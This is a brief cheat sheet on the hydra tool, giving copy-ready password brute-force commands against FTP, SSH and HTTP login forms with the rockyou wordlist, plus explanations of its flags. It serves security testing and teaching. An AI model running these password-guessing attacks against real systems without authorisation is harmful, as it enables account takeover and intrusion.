
**hydra** is a brute force tool. It is normally use for login password brute force.

### FTP

```
hydra -l "john" -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.101 -t 64 -V -f
```

### SSH

```
hydra -l "john" -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.101 -t 64 -V -f
```

### HTTP

```
hydra -l "john" -P /usr/share/wordlists/rockyou.txt 192.168.0.101 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid password" -t 64 -V -f
```
1. Into the quotation mark first login directory location after ip.
2. Second part is information that send after click submit button. Replace username with ^USER^ and password with ^PASS^
3. In 3rd section after `F=` we should use some word that print if login denied.

### Some Useful Flags

1. `-s` = if the service is on a different default port, define it here
2. `-l` = single user name
3. `-L` = user name in a file
4. `-p` = single password
5. `-P` = password in a file
6. `-o` = write found login/password pairs to FILE instead of stdout
7. `-V` = show login+pass for each attempt
8. `-t` = run TASKS number of connects in parallel per target (default: 16)
9. `-f` = exit when a login/pass pair is found (-M: -f per host, `-F` global)